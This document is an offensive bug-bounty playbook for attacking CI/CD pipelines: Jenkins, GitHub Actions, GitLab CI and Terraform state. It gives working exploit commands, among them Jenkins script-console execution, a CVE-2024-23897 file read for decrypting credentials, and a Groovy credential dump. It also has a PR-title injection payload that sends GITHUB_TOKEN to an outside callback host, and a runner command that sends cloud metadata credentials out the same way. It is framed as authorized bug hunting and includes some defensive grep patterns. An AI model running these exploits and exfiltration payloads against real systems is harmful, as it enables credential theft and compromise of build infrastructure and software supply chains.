# Moraa — CI/CD pipeline attacks (Jenkins / GitHub Actions / GitLab CI / Terraform state)

> Sourced from elementalsouls/Claude-BugHunter `hunt-cicd`. Cross-ref [[supply-chain]] (artifact
> integrity), [[cloud]] (OIDC role assumption → cloud takeover), [[k8s]] (self-hosted runner → cluster).

## Recon first
Identify the platform (Jenkins/GitHub Actions/GitLab/CircleCI/TeamCity/Drone/Argo), enumerate public
repos and workflow files, check for exposed dashboards. Statically lint workflow files for injection
patterns with `actionlint`/`zizmor` before touching anything live.

## Jenkins
```bash
# unauthenticated script console?
for p in /script /jenkins/script /scriptText /jenkins/scriptText; do
  curl -so /dev/null -w "$p -> %{http_code}\n" "https://$TARGET$p"; done
curl -s -X POST "https://$TARGET/scriptText" --data-urlencode 'script=println "id".execute().text'
# ^ proof = literal id output (uid=…), NOT a login page
```
**CVE-2024-23897** (Jenkins ≤2.441 / LTS ≤2.426.2), pre-auth file read via args4j `@`-expansion:
```bash
java -jar jenkins-cli.jar -s "https://$TARGET/" -http connect-node "@/etc/passwd"
# then: @/var/lib/jenkins/secret.key, @/var/lib/jenkins/secrets/master.key → decrypt credentials.xml
```
Credential extraction once you have script-console access (Groovy):
```groovy
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials
CredentialsProvider.lookupCredentials(StandardUsernamePasswordCredentials, jenkins.model.Jenkins.instance)
  .each { println "${it.id} :: ${it.username} :: ${it.password}" }
```

## GitHub Actions — the big one: `pull_request_target` + untrusted expansion
Find the injectable pattern first:
```bash
gh api "repos/ORG/REPO/contents/.github/workflows/WF.yml" | jq -r '.content' | base64 -d \
  | grep -Eq 'pull_request_target.*\$\{\{ *github\.event' && echo "INJECTABLE"
```
**Template injection ("pwnrequest")** — untrusted fields (PR title, branch name, commit message) get
`${{ }}`-expanded directly into a shell `run:` block BEFORE the shell executes:
```
PR title: a"; printenv GITHUB_TOKEN | base64 | tr -d '\n' | curl -d @- https://COLLAB/?t=; echo "
```
Env vars, not files — use `printenv`/`cat /proc/self/environ`, never `cat $GITHUB_TOKEN`.

Full injectable-context list — check every one, not just PR title:
```
github.event.pull_request.title / .body
github.event.pull_request.head.ref        ← branch name
github.event.issue.title / .body
github.event.comment.body
github.event.review.body
github.event.review_comment.body
github.event.discussion.title / .body
github.head_ref                            ← alias for branch name
github.event.inputs.*                      ← workflow_dispatch inputs (see row below)
```
```bash
grep -rn '\${{.*github\.event\.\(pull_request\|issue\|comment\|review\|discussion\)' .github/workflows/
grep -rn '\${{.*github\.head_ref' .github/workflows/
grep -rn 'uses: [^@]*@\(main\|master\|v[0-9]\+\)' .github/workflows/     # unpinned action — tag not SHA, hijackable if maintainer's account is popped
```

**Poisoned checkout** — if `pull_request_target` checks out the PR head and runs a build hook
(npm `preinstall`, Makefile, a repo action), put the exfil there instead of the workflow YAML itself.

**Self-hosted runner poisoning** — a public repo with `runs-on: self-hosted` on `pull_request_target`
lets a fork PR execute on the ORG'S OWN infrastructure:
```bash
whoami; hostname; id
curl "https://COLLAB/?imds=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 -w0)"
```

**OIDC trust-policy abuse** — check the role's trust policy for an overly broad `sub` (`repo:ORG/*:*`
or no condition at all); if your controlled workflow can assume it, `aws sts get-caller-identity`
proves the privileged role.

**Actions cache poisoning** — a workflow keyed on an attacker-controlled value can plant a poisoned
cache entry a LATER, privileged workflow then restores.

## GitHub Actions — `issue_comment` + derived-checkout (distinct from pull_request_target)
A different trigger AND a different vulnerable construct than the `pull_request_target` +
`${{ }}`-expansion pattern above — not a variant of it. Real case: Google's Flank repo, where this
sat undisclosed/unpatched for 3+ years precisely because the indirection hid it (adnanthekhan.com,
"An Obscure Actions Workflow Vulnerability in Google's Flank").

- **Trigger:** `on: issue_comment` — fires on ANY comment on ANY issue or PR, by ANYONE. Lower bar
  than `pull_request_target`: you don't need to open a PR, just comment.
- **The indirection:** the workflow never interpolates a context variable directly. It PARSES the PR
  number out of `github.event.issue.pull_request.url` via string extraction/manipulation. The
  injection point is hidden one hop away from the context — reviewers and grep patterns looking only
  for the classic `${{ github.event.pull_request.title }}`-in-a-`run:`-block shape will MISS it.
- **Sink:** the derived PR number is used unsafely in a PRIVILEGED step —
  `gh pr checkout ${{ <derived-pr-number> }}` — checking out, then building/running the
  attacker-commented PR's code with `GITHUB_TOKEN` (write scope) and repo secrets in reach (in the
  real case, a GCloud service-account key).

```bash
# recon addition — the classic greps in the section above MISS this shape. Find comment-triggered
# workflows first, then read each one fully and trace where event-derived values flow.
grep -rn 'issue_comment' .github/workflows/
# in each hit: flag `gh pr checkout` / `actions/checkout` fed ANY value derived (even indirectly,
# via string parsing/slicing) from event data — audit it regardless of whether any direct
# ${{ github.event.* }} interpolation appears anywhere in the file.
```

## GitLab CI
```bash
curl -s "https://$TARGET/api/v4/runners?type=instance_type" -H "PRIVATE-TOKEN: $TOK"   # find runner reg tokens
curl -s "https://$TARGET/api/v4/projects/PID/variables" -H "PRIVATE-TOKEN: $TOK"        # unmasked/unprotected vars
curl -s "https://$TARGET/api/v4/projects/PID/repository/files/.gitlab-ci.yml/raw?ref=main" -H "PRIVATE-TOKEN: $TOK"
```
Prove impact by registering an ephemeral runner and capturing a real masked variable from a live job.

## Terraform state leakage (real credentials, not just resource IDs)
```bash
for U in "https://$ORG.s3.amazonaws.com/terraform.tfstate" \
         "https://storage.googleapis.com/$ORG-tfstate/default.tfstate" \
         "https://$ORG.blob.core.windows.net/tfstate/terraform.tfstate"; do
  curl -s -o /tmp/tf.json -w "%{http_code}" "$U" | grep -q 200 && \
  jq '.resources[].instances[].attributes|to_entries[]|select(.key|test("password|secret|private_key|token|access_key";"i"))' /tmp/tf.json
done
gh search code --owner ORG "terraform.tfstate"
# other remote backends worth the same jq sweep once you have a state file:
# Consul: consul kv get terraform/state/default | HTTP backend: curl $STATE_URL
# also pull `terraform output -json` separately — outputs can be readable even when you can't reach the backend directly
```
**Proof requirement:** extract a LIVE credential and prove it authenticates (`aws sts get-caller-identity`).
State that only contains resource IDs/ARNs is not a finding.

## Secrets in build logs / artifacts / images
```bash
gh api "repos/ORG/REPO/actions/runs" | jq -r '.workflow_runs[:20][].id' | while read id; do
  gh api "repos/ORG/REPO/actions/runs/$id/logs" -o /tmp/r.zip 2>/dev/null && unzip -qo /tmp/r.zip -d /tmp/logs
  grep -riE 'AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|-----BEGIN|eyJ[A-Za-z0-9_-]{10,}\.' /tmp/logs
done
trufflehog docker --image ORG/IMAGE:latest --only-verified
```
`--only-verified` is the discipline here — possessing a string is not proof; demonstrate the credential
actually authenticates.

## Validation gates (before you write a finding)
| Finding | Proof required |
|---|---|
| Jenkins script console | POST returns your real `id` output, not a login page |
| CVE-2024-23897 | Actual `/etc/passwd` content, version confirmed in range |
| Actions `${{ }}` injection | Blind Collaborator callback from the runner IP + decoded token |
| `workflow_dispatch` input injection | Same as above but via `github.event.inputs.*` — unvalidated inputs interpolated into `run:`; trigger via `gh workflow run` with a malicious input value, confirm callback |
| Self-hosted runner | Real code execution as the runner user + IMDS metadata pulled |
| OIDC abuse | `sts get-caller-identity` returns the privileged ARN |
| Terraform state | `jq`-extracted live secret + read-only auth proof |
| Image/log secrets | `trufflehog --only-verified` + actual credential use |

Never report: login pages, permissive-looking policy text with no exploitation proof, masked
protected-branch variables, unverified/expired credential matches.
